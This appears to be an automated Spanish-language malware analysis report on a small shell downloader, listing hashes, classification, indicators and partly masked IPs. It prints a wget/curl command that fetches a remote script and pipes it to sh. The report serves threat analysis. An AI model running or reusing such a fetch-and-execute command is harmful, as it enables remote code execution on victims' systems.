# 🧬 Payload Analysis

`ac0448e42eeb70ddf7486fef02c4d963534bcba37186f127c4e8b5efe3d7c90a`

## 📌 Resumen

Texto ASCII de 373 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `sh` en `hxxps://217.60.195.XXX/sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh`
2. `curl -sk hxxps://217.60.195.XXX/sh)`
3. `sh -s apache.selfre` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/ac0448e42eeb70ddf7486fef02c4d963534bcba37186f127c4e8b5efe3d7c90a.md](../../../../../malware-like/oraculo/downloader/ac0448e42eeb70ddf7486fef02c4d963534bcba37186f127c4e8b5efe3d7c90a.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:51:31.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `ac0448e42eeb70ddf7486fef02c4d963534bcba37186f127c4e8b5efe3d7c90a`
- **SHA1:** `3b5ae744a74def65a6a0eba415b90928cf637ea2`
- **MD5:** `9441fa86a8046f03d839d184d33e751e`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 373 B |
| Entropía | 5.11 |
| Strings | 9 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=6

## 🖥️ Comandos observados / extraídos

```text
(wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh || curl -sk hxxps://217.60.195.XXX/sh) | sh -s apache.selfre
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxps://217.60.195.XXX/sh) | strings |
| url | hxxps://217.60.195.XXX/sh | strings |
| ip | 217.60.195.XXX | static_analysis |
| ip | 190.179.169.XXX | static_analysis |
| command | (wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh \|\| curl -sk hxxps://217.60.195.XXX/sh) \| sh -s apache.selfre | strings |
| hash | ac0448e42eeb70ddf7486fef02c4d963534bcba37186f127c4e8b5efe3d7c90a | static_analysis |
| ip | 60.165.53.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
